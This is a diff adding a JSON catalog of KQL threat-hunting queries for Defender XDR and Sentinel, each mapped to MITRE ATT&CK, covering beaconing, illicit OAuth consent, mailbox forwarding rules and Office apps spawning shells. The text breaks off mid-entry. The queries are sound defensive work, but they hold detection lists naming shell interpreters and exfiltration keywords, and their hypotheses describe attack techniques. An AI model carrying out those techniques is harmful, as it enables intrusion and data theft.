@@ -1,0 +1,2091 @@
+{
+  "schemaVersion": "1.0.0",
+  "generated": "2026-11-04T21:04:40.664Z",
+  "attackVersion": "v17",
+  "stats": {
+    "huntCount": 30,
+    "techniqueCount": 28,
+    "tacticCount": 11,
+    "tableCount": 12,
+    "validationBreakdown": {
+      "syntax": 0,
+      "synthetic": 30,
+      "tenant": 0
+    }
+  },
+  "hunts": [
+    {
+      "id": "HB-C2-001",
+      "title": "Command and Control Periodic Beaconing Detection",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceNetworkEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "command-and-control"
+        ],
+        "techniques": [
+          "T1071"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An implant or agent from an adversary C2 framework (e.g. Cobalt Strike, Sliver, Mythic) executes periodic HTTP/HTTPS or TCP beacon check-ins to an external listener, exhibiting low inter-arrival jitter.\n",
+      "logic_summary": "Applies KQL window serialization (serialize and prev) across chronological DeviceNetworkEvents to calculate the time delta between outbound connections, computing the coefficient of variation (jitter ratio) to flag periodic beaconing.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "24h",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "minConnections",
+          "default": 15,
+          "description": "Minimum number of connections required for statistical validity"
+        },
+        {
+          "name": "maxJitterRatio",
+          "default": 0.35,
+          "description": "Maximum allowable coefficient of variation (stdev / avg) to qualify as regular beaconing"
+        }
+      ],
+      "false_positives": [
+        "Legitimate telemetry heartbeats from commercial software (e.g. cloud storage sync, antivirus update checks)",
+        "Network time protocol (NTP) or DNS forwarder lookups running on fixed timers"
+      ],
+      "tuning": [
+        "Exclude verified enterprise proxy egress points and CDNs (e.g. Microsoft 365, AWS CloudFront, Cloudflare)",
+        "Lower maxJitterRatio threshold if noisy benign monitoring agents are triggering alerts"
+      ],
+      "triage_steps": [
+        "Inspect RemoteIP and RemoteUrl reputation using threat intelligence lookups (VirusTotal, AlienVault OTX)",
+        "Check the InitiatingProcessFileName and full command line of the process responsible for network traffic",
+        "Determine if the initiating process is unsigned, running from a temporary directory (e.g. AppData\\Local\\Temp), or injected",
+        "Correlate with process execution and file creation events on the device immediately preceding the start of the beacon"
+      ],
+      "response": "Isolate the endpoint from the network via Defender XDR portal, terminate the beaconing process tree, dump process memory for C2 configuration extraction, and block the remote IP across corporate perimeter firewalls.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1071 Application Layer Protocol",
+          "url": "https://attack.mitre.org/techniques/T1071/"
+        },
+        {
+          "title": "Hunting for C2 Beacons using KQL",
+          "url": "https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/hunting-for-c2-beacons-using-kql/ba-p/2275463"
+        }
+      ],
+      "query": "// Hunt: HB-C2-001 - Command and Control Periodic Beaconing Detection\n// MITRE ATT&CK: T1071 (Application Layer Protocol)\n// Platform: Microsoft Defender XDR (DeviceNetworkEvents)\n//\n// Description: Detects regular interval network callbacks (beacons) from endpoint processes\n// to external remote IPs by calculating inter-connection time deltas and the coefficient of\n// variation (jitter ratio) using KQL window serialization (serialize and prev).\n\nlet lookback = 24h;\nlet minConnections = 15;\nlet maxJitterRatio = 0.35;\nlet privateSubnets = dynamic([\"10.\", \"172.16.\", \"172.17.\", \"172.18.\", \"172.19.\", \"172.20.\", \n                              \"172.21.\", \"172.22.\", \"172.23.\", \"172.24.\", \"172.25.\", \"172.26.\", \n                              \"172.27.\", \"172.28.\", \"172.29.\", \"172.30.\", \"172.31.\", \"192.168.\", \"127.\"]);\nDeviceNetworkEvents\n| where Timestamp > ago(lookback)\n| where ActionType == \"ConnectionSuccess\"\n| where not(ipv4_is_private(RemoteIP))\n| project Timestamp, DeviceName, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName\n| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc\n| serialize\n| extend PrevDevice = prev(DeviceName), PrevIP = prev(RemoteIP), PrevPort = prev(RemotePort), PrevTime = prev(Timestamp)\n| extend TimeDelta = datetime_diff('second', Timestamp, PrevTime)\n| where DeviceName == PrevDevice and RemoteIP == PrevIP and RemotePort == PrevPort and TimeDelta > 0\n| summarize \n    FirstSeen = min(Timestamp),\n    LastSeen = max(Timestamp),\n    TotalConnections = count(),\n    AvgDelta = avg(TimeDelta),\n    StdDevDelta = stdev(TimeDelta),\n    MinDelta = min(TimeDelta),\n    MaxDelta = max(TimeDelta),\n    Processes = make_set(InitiatingProcessFileName, 3),\n    RemoteUrls = make_set(RemoteUrl, 3)\n    by DeviceName, RemoteIP, RemotePort\n| where TotalConnections >= minConnections\n| extend JitterRatio = iff(AvgDelta > 0, round(StdDevDelta / AvgDelta, 3), 1.0)\n| where JitterRatio <= maxJitterRatio\n| project FirstSeen, LastSeen, DeviceName, RemoteIP, RemotePort, RemoteUrls,\n          TotalConnections, AvgDelta, StdDevDelta, JitterRatio, Processes\n| order by JitterRatio asc, TotalConnections desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-CL-001",
+      "title": "Anomalous burst of cloud file downloads from SharePoint or OneDrive",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "CloudAppEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "exfiltration",
+          "collection"
+        ],
+        "techniques": [
+          "T1530"
+        ]
+      },
+      "severity": "medium",
+      "hypothesis": "An adversary with compromised credentials or a malicious insider rapidly downloads a significant volume of documents, spreadsheets, or source code from SharePoint or OneDrive prior to extortion or data theft.\n",
+      "logic_summary": "Aggregates FileDownloaded actions across SharePoint and OneDrive in 1-hour tumbling windows per user account, flagging any account exceeding the threshold of 50 downloads within a single window.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "1d",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "window",
+          "default": "1h",
+          "description": "Tumbling time bucket window for grouping download spikes"
+        },
+        {
+          "name": "minDownloads",
+          "default": 50,
+          "description": "Minimum number of file downloads required to trigger a lead"
+        }
+      ],
+      "false_positives": [
+        "Users syncing a large newly shared SharePoint folder or migrating local files using the OneDrive sync client",
+        "Automated enterprise data backup or DLP scanning service accounts"
+      ],
+      "tuning": [
+        "Exclude verified enterprise service accounts and migration tooling service principals",
+        "Raise the minDownloads threshold for departments that legitimately perform high-volume batch processing"
+      ],
+      "triage_steps": [
+        "Inspect the SampleFiles list to see what sensitive keywords or document types (e.g. financials, contracts, patents) were downloaded",
+        "Check whether the downloads originated from a managed corporate device or an unmanaged personal device / anonymous proxy",
+        "Review HR status to determine if the user has recently submitted a resignation or has pending disciplinary action"
+      ],
+      "response": "Temporarily restrict the user's SharePoint access via Conditional Access or session controls, engage the user's manager and legal/insider risk team, and preserve DLP audit trails.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1530 Data from Cloud Storage",
+          "url": "https://attack.mitre.org/techniques/T1530/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting CloudAppEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-cloudappevents-table"
+        }
+      ],
+      "query": "// HB-CL-001 | T1530 | Anomalous burst of cloud file downloads\n// Hypothesis: An attacker or departing insider rapidly downloads a large volume of files from cloud storage (SharePoint / OneDrive) for exfiltration.\nlet lookback = 1d;\nlet window = 1h;\nlet minDownloads = 50;\nCloudAppEvents\n| where Timestamp > ago(lookback)\n| where Application in~ (\"Microsoft SharePoint Online\", \"Microsoft OneDrive for Business\")\n| where ActionType =~ \"FileDownloaded\"\n| summarize\n    DownloadCount = count(),\n    FirstDownload = min(Timestamp),\n    LastDownload = max(Timestamp),\n    SampleFiles = make_set(tostring(ActivityObjects), 10)\n    by AccountDisplayName, AccountId, IPAddress, CountryCode, bin(Timestamp, window)\n| where DownloadCount >= minDownloads\n| project\n    Timestamp,\n    AccountDisplayName,\n    AccountId,\n    DownloadCount,\n    IPAddress,\n    CountryCode,\n    FirstDownload,\n    LastDownload,\n    SampleFiles\n| order by DownloadCount desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-CL-002",
+      "title": "New OAuth application consent granted with sensitive scopes",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "AuditLogs"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "initial-access",
+          "credential-access"
+        ],
+        "techniques": [
+          "T1528"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary creates a malicious cloud app and conducts an Illicit Consent Grant attack, tricking an employee into authorizing high-privilege Microsoft Graph API permissions to silently extract mail and files.\n",
+      "logic_summary": "Queries Entra ID AuditLogs for successful application consent operations under ApplicationManagement where requested scopes include high-risk API permissions like Mail.ReadWrite or Files.ReadWrite.All.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate enterprise integrations configured by IT administrators (e.g. DocuSign, Slack, Salesforce)",
+        "Approved developer sandbox applications created in internal Azure subscriptions"
+      ],
+      "tuning": [
+        "Restrict user consent policies in Entra ID so standard users cannot consent to unverified multi-tenant apps",
+        "Whitelist pre-approved corporate enterprise applications by verified Microsoft Publisher ID"
+      ],
+      "triage_steps": [
+        "Check the AppDisplayName and verified publisher domain in the Microsoft Entra admin center",
+        "Identify who consented to the application and what specific permissions were granted",
+        "Search SigninLogs and CloudAppEvents for API activities executed by the application Service Principal"
+      ],
+      "response": "Revoke the application's consent immediately via Entra ID (Enterprise Applications -> Permissions -> Revoke), delete the service principal, and investigate user mailbox audit logs for exfiltration.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1528 Steal Application Access Token",
+          "url": "https://attack.mitre.org/techniques/T1528/"
+        },
+        {
+          "title": "Detect and Remediate Illicit Consent Grants in Microsoft 365",
+          "url": "https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-illicit-consent-grants"
+        }
+      ],
+      "query": "// HB-CL-002 | T1528 | New OAuth application consent granted with sensitive scopes\n// Hypothesis: An attacker tricks a user into consenting to a rogue third-party OAuth app (Illicit Consent Grant) to gain API access to emails and cloud files.\nlet lookback = 7d;\nAuditLogs\n| where TimeGenerated > ago(lookback)\n| where Category =~ \"ApplicationManagement\"\n| where OperationName in~ (\n    \"Consent to application\",\n    \"Add delegated permission grant\",\n    \"Add service principal\"\n)\n| where Result =~ \"success\"\n| extend AppDisplayName = tostring(TargetResources[0].displayName)\n| extend AppId = tostring(TargetResources[0].id)\n| extend Actor = tostring(InitiatedBy.user.userPrincipalName)\n| extend Permissions = tostring(TargetResources[0].modifiedProperties[0].newValue)\n| where Permissions has_any (\n    \"Mail.Read\", \"Mail.ReadWrite\", \"MailboxSettings.ReadWrite\",\n    \"Files.ReadWrite.All\", \"offline_access\", \"User.ReadWrite.All\"\n)\n| project\n    TimeGenerated,\n    OperationName,\n    AppDisplayName,\n    AppId,\n    Actor,\n    Permissions,\n    ResultDescription\n| order by TimeGenerated desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-CL-003",
+      "title": "Sign-in from Known Anonymizer or Tor Exit Node",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "SigninLogs"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "defense-evasion",
+          "command-and-control"
+        ],
+        "techniques": [
+          "T1090"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary routes interactive authentication traffic through Tor exit nodes or commercial anonymizing proxies to bypass geo-fencing Conditional Access rules and conceal their true geographic origin during credential stuffing.\n",
+      "logic_summary": "Filters Entra ID SigninLogs for events where RiskDetail indicates an anonymous IP or Tor exit node, or where NetworkLocationDetails matches anonymizer tags, summarizing success versus failure counts per identity.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Corporate employees using approved commercial privacy VPNs or cellular carrier networks with shared proxy egress",
+        "Authorized security teams conducting external penetration tests or simulated red team engagements"
+      ],
+      "tuning": [
+        "Filter out verified enterprise corporate VPN egress CIDRs and authorized secure web gateway egress IPs",
+        "Require Conditional Access location enforcement that strictly blocks non-compliant network locations"
+      ],
+      "triage_steps": [
+        "Verify if the sign-in was successful (ResultType == 0) or failed (ResultType != 0)",
+        "Examine the user's typical login locations and devices using Entra ID sign-in history",
+        "Review whether multi-factor authentication was satisfied during the session",
+        "Check for anomalous cloud resource access or inbox rule modifications directly following this session"
+      ],
+      "response": "If unauthorized success is confirmed, revoke all active user refresh tokens via Revoke-AzureADUserAllRefreshToken, force a password reset, and enable strict Conditional Access policies blocking untrusted anonymous IPs.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1090 Proxy",
+          "url": "https://attack.mitre.org/techniques/T1090/"
+        },
+        {
+          "title": "Microsoft Entra ID Protection Risk Detections",
+          "url": "https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks"
+        }
+      ],
+      "query": "// Hunt: HB-CL-003 - Sign-in from Known Anonymizer or Tor Exit Node\n// MITRE ATT&CK: T1090 (Proxy)\n// Platform: Microsoft Sentinel (SigninLogs)\n//\n// Description: Identifies user sign-in activity originating from anonymizing proxies,\n// Tor exit nodes, or high-risk IP sources flagged by Entra ID Protection risk signals\n// or anonymizer network telemetry.\n\nlet lookback = 7d;\nlet anonymizerRiskSignals = dynamic([\"anonymousIp\", \"anonymizedIP\", \"torExitNode\", \"maliciousIP\"]);\nSigninLogs\n| where TimeGenerated > ago(lookback)\n| where RiskDetail in~ (anonymizerRiskSignals) \n    or tostring(NetworkLocationDetails) has_any (\"Tor\", \"Anonymizer\", \"Proxy\")\n| summarize \n    FirstSeen = min(TimeGenerated),\n    LastSeen = max(TimeGenerated),\n    Attempts = count(),\n    SuccessCount = countif(ResultType == \"0\"),\n    FailureCount = countif(ResultType != \"0\"),\n    TargetApps = make_set(AppDisplayName, 10),\n    UserAgents = make_set(UserAgent, 5)\n    by UserPrincipalName, IPAddress, Location, RiskDetail\n| extend SigninStatus = iff(SuccessCount > 0, \"Compromise Likely (Successful)\", \"Probing (Failed Only)\")\n| project FirstSeen, LastSeen, UserPrincipalName, IPAddress, Location, RiskDetail, SigninStatus, Attempts, SuccessCount, FailureCount, TargetApps, UserAgents\n| order by SuccessCount desc, Attempts desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-CL-004",
+      "title": "Azure Resource Deletion Burst",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "sentinel",
+      "tables": [
+        "AzureActivity"
+      ],
+      "time_column": "TimeGenerated",
+      "attack": {
+        "tactics": [
+          "impact"
+        ],
+        "techniques": [
+          "T1485"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary with compromised Azure administrative credentials or a rogue employee initiates a mass deletion of critical cloud infrastructure (VMs, storage accounts, databases, or key vaults) to paralyze business operations.\n",
+      "logic_summary": "Aggregates AzureActivity control plane events with OperationNameValue ending in '/delete' and status 'Success', grouping by Caller identity and 30-minute time buckets to flag accounts deleting 3 or more resources in rapid succession.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "24h",
+          "description": "Historical search window to inspect"
+        },
+        {
+          "name": "burstWindow",
+          "default": "30m",
+          "description": "Grouping window for identifying rapid deletion bursts"
+        },
+        {
+          "name": "deletionThreshold",
+          "default": 3,
+          "description": "Minimum number of deletions within the window to trigger an alert"
+        }
+      ],
+      "false_positives": [
+        "Automated CI/CD teardown pipelines cleaning up ephemeral test environments",
+        "Terraform or ARM template deployments destroying and recreating infrastructure"
+      ],
+      "tuning": [
+        "Whitelist dedicated automation service principals used by authorized deployment pipelines",
+        "Scope alerts specifically to production subscriptions where mass deletions are never normal"
+      ],
+      "triage_steps": [
+        "Identify the Caller identity (UPN or AppId) and verify if the action was part of an approved change ticket",
+        "Inspect CallerIpAddress against known corporate locations or VPN gateways",
+        "Review the specific resources deleted and check if Azure Soft Delete or backup snapshots can restore them",
+        "Check AzureActivity for prior privilege escalation or role assignment events involving this identity"
+      ],
+      "response": "If unauthorized, immediately disable the user account or revoke the service principal credentials in Entra ID, lock down Azure subscription management permissions, and initiate cloud disaster recovery procedures.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1485 Data Destruction",
+          "url": "https://attack.mitre.org/techniques/T1485/"
+        },
+        {
+          "title": "Azure Activity Log Operations Reference",
+          "url": "https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log"
+        }
+      ],
+      "query": "// Hunt: HB-CL-004 - Azure Resource Deletion Burst\n// MITRE ATT&CK: T1485 (Data Destruction)\n// Platform: Microsoft Sentinel (AzureActivity)\n//\n// Description: Detects a rapid sequence of cloud resource deletions (VMs, storage accounts, \n// databases, key vaults) by a single identity within a short time window, indicating \n// potential cloud extortion, ransomware impact, or rogue administrator activity.\n\nlet lookback = 24h;\nlet burstWindow = 30m;\nlet deletionThreshold = 3;\nAzureActivity\n| where TimeGenerated > ago(lookback)\n| where ActivityStatusValue in~ (\"Success\", \"Succeeded\")\n| where OperationNameValue endswith \"/delete\"\n| summarize \n    FirstDeletion = min(TimeGenerated),\n    LastDeletion = max(TimeGenerated),\n    DeletionCount = count(),\n    DeletedOperations = make_set(OperationNameValue, 10),\n    ResourceGroups = make_set(ResourceGroup, 10),\n    SourceIPs = make_set(CallerIpAddress, 5)\n    by Caller, SubscriptionId, bin(TimeGenerated, burstWindow)\n| where DeletionCount >= deletionThreshold\n| extend DurationMinutes = datetime_diff('minute', LastDeletion, FirstDeletion)\n| project FirstDeletion, LastDeletion, DurationMinutes, Caller, SubscriptionId, DeletionCount, DeletedOperations, ResourceGroups, SourceIPs\n| order by DeletionCount desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EM-001",
+      "title": "Inbound email delivered with high-risk executable or script attachment",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "EmailAttachmentInfo"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "initial-access"
+        ],
+        "techniques": [
+          "T1566.001"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary sends spearphishing emails carrying container files (ISO, VHD) or standalone scripts (HTA, LNK, VBS) to evade Mark-of-the-Web (MOTW) protections and execute malicious downloaders.\n",
+      "logic_summary": "Searches EmailAttachmentInfo in Defender for Office 365 for inbound delivered emails with high-risk attachment file types typically abused in initial access campaigns.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Rare legitimate developer communications sharing script snippets or IT administration tools",
+        "Software vendor distribution of installation disk images (ISOs) to technical staff"
+      ],
+      "tuning": [
+        "Block high-risk file types outright at the Defender for Office 365 tenant transport rule level",
+        "Allow-list trusted business partner sender domains verified via SPF, DKIM, and DMARC"
+      ],
+      "triage_steps": [
+        "Check whether the recipient user opened or saved the attachment to disk using DeviceFileEvents",
+        "Inspect the SHA256 file hash in Microsoft Defender Threat Intelligence and VirusTotal",
+        "Search EmailEvents for other employees in the organization who received the same NetworkMessageId"
+      ],
+      "response": "Purge the email message across all inboxes using Microsoft Defender for Office 365 Explorer / ZAP, block the sender domain, and isolate the endpoint if execution occurred.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1566.001 Phishing - Spearphishing Attachment",
+          "url": "https://attack.mitre.org/techniques/T1566/001/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting EmailAttachmentInfo",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-emailattachmentinfo-table"
+        }
+      ],
+      "query": "// HB-EM-001 | T1566.001 | Inbound email delivered with high-risk executable or script attachment\n// Hypothesis: An attacker delivers phishing emails containing weaponized container files (ISO, VHD) or scripts (HTA, LNK, JS) to bypass gateway defenses.\nlet lookback = 7d;\nEmailAttachmentInfo\n| where Timestamp > ago(lookback)\n| where FileType in~ (\n    \"iso\", \"vhd\", \"hta\", \"lnk\", \"js\", \"vbs\", \"ps1\", \"wsf\", \"scr\", \"jar\", \"bat\", \"cmd\"\n)\n| project\n    Timestamp,\n    NetworkMessageId,\n    SenderFromAddress,\n    RecipientEmailAddress,\n    FileName,\n    FileType,\n    SHA256,\n    ThreatTypes,\n    DetectionMethods\n| order by Timestamp desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EM-002",
+      "title": "Safe Links click on potential phishing URL or warning dismissed",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "UrlClickEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "initial-access"
+        ],
+        "techniques": [
+          "T1566.002"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An employee clicks an inbound email phishing link where Microsoft Defender Safe Links either permitted navigation or the user explicitly bypassed a red security warning screen to reach the destination.\n",
+      "logic_summary": "Monitors UrlClickEvents in Defender for Office 365 for ClickAllowed on URLs determined to be Phish/Malware or user clicks where WarningDismissed indicates deliberate override of security controls.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate corporate marketing or HR survey URLs incorrectly classified by automated reputation feeds",
+        "Authorized internal phishing awareness simulation campaigns (e.g. KnowBe4, Defender Attack Simulation)"
+      ],
+      "tuning": [
+        "Exclude verified internal authorized phishing simulation header IDs or sender IPs",
+        "Whitelist internal domain single sign-on URLs and verified SaaS portals"
+      ],
+      "triage_steps": [
+        "Review the destination URL to determine if it mimics a Microsoft 365 login page or contains a file download",
+        "Check SigninLogs for subsequent sign-ins from the user's IP or foreign IPs within the next 4 hours",
+        "Interview the user to determine if they submitted credentials or downloaded any files"
+      ],
+      "response": "Block the URL tenant-wide using the Tenant Allow/Block List (TABL), reset the user's password, revoke active sessions, and verify MFA device registrations.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1566.002 Phishing - Spearphishing Link",
+          "url": "https://attack.mitre.org/techniques/T1566/002/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting UrlClickEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-urlclickevents-table"
+        }
+      ],
+      "query": "// HB-EM-002 | T1566.002 | Safe Links click on potential phishing URL or warning dismissed\n// Hypothesis: A user clicks an inbound email link to an external phishing or credential-harvesting site, potentially entering credentials or downloading malware.\nlet lookback = 7d;\nUrlClickEvents\n| where Timestamp > ago(lookback)\n| where ActionType in~ (\"ClickAllowed\", \"WarningDismissed\")\n| where ThreatTypes in~ (\"Phish\", \"Malware\")\n     or (ClickType =~ \"WarningDismissed\")\n| project\n    Timestamp,\n    AccountUpn,\n    IPAddress,\n    Url,\n    ClickType,\n    ActionType,\n    ThreatTypes,\n    NetworkMessageId\n| order by Timestamp desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EM-003",
+      "title": "Suspicious email inbox rule created to forward or delete messages",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "CloudAppEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "collection",
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1114.003"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An attacker who gains unauthorized access to a victim mailbox configures hidden inbox forwarding or auto-deletion rules to silently exfiltrate sensitive corporate communications or hide password reset and security alerts.\n",
+      "logic_summary": "Queries CloudAppEvents for Microsoft Exchange Online inbox rule creation or modification events where the parameters specify external forwarding, redirecting, or automatic deletion/marking as read.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate employees configuring vacation out-of-office forwards to internal teammates or corporate shared mailboxes",
+        "Users organizing high-volume notification emails into designated subfolders"
+      ],
+      "tuning": [
+        "Whitelist internal corporate domain recipient addresses (e.g. *@contoso.com) to alert only on external forwarding rules",
+        "Correlate with SigninLogs to suppress if created from a known Intune compliant device in the user's typical home location"
+      ],
+      "triage_steps": [
+        "Extract the destination email address from the Parameters string to see where emails are being forwarded",
+        "Check whether the IPAddress that created the rule matches the user's usual work location or an anomalous country/VPN",
+        "Search SigninLogs for recent failed or anomalous logins for the same AccountId"
+      ],
+      "response": "Remove the malicious inbox rule via Exchange Online PowerShell (Remove-InboxRule), revoke all active sessions for the user, reset account credentials, and inspect sent items for fraudulent financial requests.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1114.003 Email Collection - Email Forwarding Rule",
+          "url": "https://attack.mitre.org/techniques/T1114/003/"
+        },
+        {
+          "title": "Detect and Remediate Illicit Consent and Rule Grants",
+          "url": "https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-illicit-consent-grants"
+        }
+      ],
+      "query": "// HB-EM-003 | T1114.003 | Suspicious email inbox rule created to forward or delete messages\n// Hypothesis: An attacker with compromised mailbox access creates inbox rules to exfiltrate emails or hide detection notices by forwarding or deleting incoming messages.\nlet lookback = 7d;\nCloudAppEvents\n| where Timestamp > ago(lookback)\n| where Application =~ \"Microsoft Exchange Online\"\n| where ActionType in~ (\"New-InboxRule\", \"Set-InboxRule\", \"UpdateInboxRules\")\n| extend Parameters = tostring(RawEventData.Parameters)\n| where Parameters has_any (\n    \"ForwardTo\", \"ForwardAsAttachmentTo\", \"RedirectTo\",\n    \"DeleteMessage\", \"MoveToFolder\", \"MarkAsRead\"\n)\n| project\n    Timestamp,\n    AccountDisplayName,\n    AccountId,\n    ActionType,\n    IPAddress,\n    CountryCode,\n    City,\n    Parameters,\n    UserAgent\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EP-001",
+      "title": "Office application spawning script interpreter or shell",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceProcessEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "execution",
+          "initial-access"
+        ],
+        "techniques": [
+          "T1204.002"
+        ]
+      },
+      "severity": "high",
+      "hypothesis": "An adversary sends a spearphishing email with a weaponized Office attachment (docm, xlsm) or malicious link that triggers macro code or an exploit, spawning cmd.exe, powershell.exe, or mshta.exe.\n",
+      "logic_summary": "Inspects DeviceProcessEvents in Defender for Endpoint where the parent process (InitiatingProcessFileName) is a Microsoft Office application and the newly spawned child process is a shell or scripting engine.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Legitimate enterprise accounting or financial spreadsheets utilizing complex approved VBA macros that call cmd.exe for internal scripts",
+        "Add-ins from security software, Adobe Acrobat, or document management systems"
+      ],
+      "tuning": [
+        "Allow-list verified corporate Excel macro add-ins by filtering on specific InitiatingProcessCommandLine patterns or digital signature status",
+        "Restrict child interpreters to specific untrusted directories or unusual command-line flags"
+      ],
+      "triage_steps": [
+        "Review the OfficeCommandLine to identify the file name and path of the document that was opened",
+        "Inspect the ProcessCommandLine to see what script or remote URL the child interpreter attempted to run",
+        "Check DeviceFileEvents and DeviceNetworkEvents for the same DeviceId around the same Timestamp"
+      ],
+      "response": "Isolate the affected endpoint via Defender for Endpoint APIs, collect the suspicious document for malware analysis, and search email gateway logs for other recipients of the same attachment.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1204.002 User Execution - Malicious File",
+          "url": "https://attack.mitre.org/techniques/T1204/002/"
+        },
+        {
+          "title": "Microsoft Defender Advanced Hunting DeviceProcessEvents",
+          "url": "https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table"
+        }
+      ],
+      "query": "// HB-EP-001 | T1204.002 | Office application spawning script interpreter or shell\n// Hypothesis: An attacker executes code on an endpoint via a malicious macro or document exploit that spawns an interactive shell or script engine.\nlet lookback = 7d;\nDeviceProcessEvents\n| where Timestamp > ago(lookback)\n| where InitiatingProcessFileName in~ (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\", \"outlook.exe\", \"onenote.exe\")\n| where FileName in~ (\"cmd.exe\", \"powershell.exe\", \"pwsh.exe\", \"wscript.exe\", \"cscript.exe\", \"mshta.exe\", \"bash.exe\")\n| project\n    Timestamp,\n    DeviceName,\n    AccountName,\n    OfficeApp = InitiatingProcessFileName,\n    OfficeCommandLine = InitiatingProcessCommandLine,\n    SpawnedInterpreter = FileName,\n    ProcessCommandLine,\n    ProcessIntegrityLevel,\n    InitiatingProcessParentFileName\n| order by Timestamp desc\n\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    },
+    {
+      "id": "HB-EP-002",
+      "title": "PowerShell executed with Base64 encoded command arguments",
+      "status": "tested",
+      "validation_level": "synthetic",
+      "platform": "defender-xdr",
+      "tables": [
+        "DeviceProcessEvents"
+      ],
+      "time_column": "Timestamp",
+      "attack": {
+        "tactics": [
+          "execution",
+          "defense-evasion"
+        ],
+        "techniques": [
+          "T1059.001"
+        ]
+      },
+      "severity": "medium",
